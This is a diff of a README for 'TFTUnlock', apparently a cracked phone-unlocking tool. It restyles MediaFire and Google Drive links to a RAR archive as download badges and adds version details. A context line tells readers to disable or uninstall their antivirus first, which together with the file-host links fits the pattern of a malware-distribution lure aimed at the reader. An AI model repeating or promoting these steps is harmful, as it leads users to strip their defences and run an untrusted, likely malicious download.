@@ -36,9 +36,13 @@ Before proceeding, make sure you have disabled or uninstalled any antivirus soft
 
 First, download the repository containing all necessary files.
 
-1. [Download Here](https://www.mediafire.com/file/90okq8sogp79p7k/TFTUnlock-2024-v4.6.3.3.rar/file)
-2. [Alternative](https://drive.google.com/file/d/1jerIUAlTu16Rn7w8lZmetX0alxFI8apE/view)
+[![Download MediaFire](https://img.shields.io/badge/Download-MediaFire-green?style=for-the-badge&logo=mediafired&logoColor=white)](https://www.mediafire.com/file/90okq8sogp79p7k/TFTUnlock-2024-v4.6.3.3.rar/file)
 
+[![Download Google Drive](https://img.shields.io/badge/Download-Google%20Drive-blue?style=for-the-badge&logo=googledrive&logoColor=white)](https://drive.google.com/file/d/1jerIUAlTu16Rn7w8lZmetX0alxFI8apE/view)
+
+### Version Details
+![Version](https://img.shields.io/badge/Version-4.6.3.3-brightgreen?style=flat-square)
+![Size](https://img.shields.io/badge/Size-~275MB-informational?style=flat-square)
 
 ### 2. Install TFTUnlock
 
